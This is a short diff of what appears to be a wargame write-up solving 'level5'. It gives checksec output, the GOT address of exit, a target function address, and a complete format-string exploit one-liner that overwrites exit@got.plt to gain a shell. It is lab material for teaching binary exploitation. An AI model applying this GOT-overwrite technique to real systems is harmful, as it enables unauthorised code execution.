@@ -19,11 +19,13 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 <hr>
 
 ## Solution
-
-0x80484a4 - addr of o
 0x8049838 - exit@got.plt
+0x80484a4 - addr of o
+0x84a4 = 33956
+0x0804 = 2052
 
 (python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"'; cat) | ./level5
+
 
 ```bash
 whoami
